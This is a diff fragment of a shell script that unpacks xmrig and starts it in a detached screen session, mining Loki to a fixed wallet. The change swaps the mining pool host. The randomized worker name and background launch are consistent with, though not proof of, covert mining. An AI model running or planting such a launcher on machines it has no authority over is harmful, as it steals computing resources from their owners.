@@ -10,4 +10,4 @@ cd /usr/share/work/ &&  tar xf xmrig-3.2.0-xenial-x64.tar.gz
 rm -rf xmrig-3.2.0-xenial-x64.tar.gz && cd xmrig-3.2.0
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 echo $cpuname" is starting"
-screen -d -m ./xmrig --donate-level 1 -o loki.herominers.com:10111 -u LZNMXtWkUrxLexkWqMA7RoYNdpjFtENkYa4XeKdxviJuV5esQYV6puq4KM2mz9ZLVD9CL96e2vnqbSQbs4r4vB6vKiqQDyB -p "Luan660777" -a argon2/chukwa -k -t 4
+screen -d -m ./xmrig --donate-level 1 -o loki.pool.mine2gether.com:3331 -u LZNMXtWkUrxLexkWqMA7RoYNdpjFtENkYa4XeKdxviJuV5esQYV6puq4KM2mz9ZLVD9CL96e2vnqbSQbs4r4vB6vKiqQDyB -p "Luan660777" -a argon2/chukwa -k -t 4
